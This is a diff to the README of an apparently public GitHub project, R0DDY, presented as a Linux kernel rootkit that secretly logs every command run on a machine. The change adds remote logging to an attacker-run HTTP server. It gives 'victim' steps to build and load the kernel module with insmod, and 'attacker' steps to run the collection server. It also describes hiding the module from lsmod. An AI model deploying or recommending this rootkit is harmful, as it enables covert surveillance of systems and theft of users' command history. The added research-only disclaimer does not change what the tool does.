@@ -1,7 +1,7 @@
 ![image](https://github.com/user-attachments/assets/cd2108da-a584-46de-91f5-52e1058dc6b0) 
 
 <div align="center">
-  <b>R0DDY</b>: Linux kernel-level rootkit (ring0) to log all commands executed in the system.<br> 
+  <b>R0DDY</b>: Linux kernel-level rootkit (ring0) to log all commands executed in the system <strong>now remotely</strong>.<br> 
   <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/Trevohack/R0DDY?style=for-the-badge&labelColor=blue&color=violet">
   <img alt="Static Badge" src="https://img.shields.io/badge/Tested--on-Linux-violet?style=for-the-badge&logo=linux&logoColor=black&labelColor=blue">
   <img alt="Static Badge" src="https://img.shields.io/badge/Based-violet?style=for-the-badge&logo=c&logoColor=black&labelColor=blue">
@@ -17,10 +17,37 @@
 
 ---
 
+> [!Important]
+> This repository is intended only for academic research, defensive security testing in isolated lab environments, CTF authorship, and malware analysis education. Do not use this project to access, monitor, or interfere with systems you do not own or have explicit written permission to test. The maintainers accept no responsibility for misuse 
 
-  
+## R0DDY - VOID 
 
-## Features
+- Log commands remotely over a `http` server
+- LKM - [RODDY - void](https://github.com/Trevohack/R0DDY/tree/main/src/R0DDY%20-%20Void)
+
+#### Set-Up On Victim 
+
+```bash
+git clone https://github.com/Trevohack/R0DDY 
+cd 'R0DDY/R0DDY - Void'
+make
+insmod roddy.ko
+```  
+
+#### Set-Up On Attacker 
+
+```bash
+git clone https://github.com/Trevohack/R0DDY 
+cd 'R0DDY/R0DDY - Void/server' 
+python3 server.py 
+```
+
+- Logged commands will be saved in a database, use the `db-viewer.py` file to view it
+
+<img width="1094" height="441" alt="image" src="https://github.com/user-attachments/assets/1a0f32be-b9ad-4bce-bbfa-25722cafaae3" />
+
+
+### Features
 
 - **Stealth Mode**: R0DDY hides itself from the `lsmod` output, making it difficult to detect through common system administration commands.
 
